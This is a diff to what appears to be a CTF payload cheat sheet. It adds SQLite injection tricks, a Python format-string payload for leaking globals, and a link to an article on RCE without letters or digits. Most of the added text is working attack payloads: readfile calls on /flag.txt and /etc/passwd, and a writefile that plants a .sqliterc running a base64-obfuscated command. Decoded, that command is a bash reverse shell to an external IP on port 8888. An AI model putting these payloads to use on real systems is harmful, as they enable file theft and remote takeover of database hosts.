@@ -85,3 +85,30 @@ sp_configure 'xp_cmdshell',1
 reconfigure
 go
 ```
+## sqlite
+
+```sql
+sqlite3.exe db.sqlite3 -cmd SELECT(name)FROM(sqlite_master)
+# 查表名
+SELECT name FROM sqlite_master WHERE type='table';
+SELECT CHAR(97);  -- 'a'
+SELECT HEX('a');  -- 61
+
+-- 2022第五空间 5_Misc_m@sTeR_0f
+SELECT writefile('/home/ctf/'||CHAR(46)||'sqliterc',"select readfile('/flag'||CHAR(46)||'txt')")
+select sqlite_version()
+
+select readfile('/etc/passwd')
+select writefile('/home/ctf/'||(SELECT substr(sqlite_version(),2,1))||'sqliterc',
+(SELECT substr(sqlite_version(),2,1)||'shell echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3Lzg4ODggMD4mMQo=|base64 -d|bash'))
+```
+# Python
+
+```
+{0.__class__.__init__.__globals__}
+```
+
+# Article
+
+[无字母数字RCE初探](http://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/) 
+
